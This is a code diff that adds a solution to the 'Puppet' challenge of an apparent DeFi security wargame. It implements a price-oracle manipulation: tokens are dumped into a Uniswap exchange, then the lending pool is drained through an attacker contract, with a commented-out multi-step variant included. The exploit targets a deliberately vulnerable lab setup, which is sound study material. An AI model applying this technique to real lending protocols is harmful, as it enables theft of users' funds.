@@ -95,6 +95,54 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+
+
+
+        // console.log(player.address);
+        // console.log(uniswapExchange.address);
+        // console.log(token.address);
+        // console.log(lendingPool.address);
+
+        // 3 transactions version 
+    
+        // await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        // now = (await ethers.provider.getBlock('latest')).timestamp;
+
+        // await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, ethers.utils.parseEther('1'), now + 100);
+        // console.log("deposit required: ", await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
+
+        // await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), gasLimit: 1e6});
+
+
+        // 1 transaction version
+        const Attacker = await ethers.getContractFactory("AttackPuppet");
+        const attacker = await Attacker.deploy(
+          uniswapExchange.address,
+          lendingPool.address,
+          token.address,
+          player.address,
+          { value: ethers.utils.parseEther('25') }
+        );
+        console.log("Attacker @", attacker.address);
+        let bal = await attacker.provider.getBalance(attacker.address);
+        console.log(
+          "Attacker ETH balance before",
+          ethers.utils.formatEther(bal.toString())
+        );
+        await token
+          .connect(player)
+          .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        bal = await token.balanceOf(attacker.address);
+        console.log(
+          `Attacker token balance before `,
+          ethers.utils.formatEther(bal.toString())
+        );
+        await attacker.swap();
+        
+        // token.connect(player).transfer(attackContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // await attackContract.attack();    
     });
 
     after(async function () {
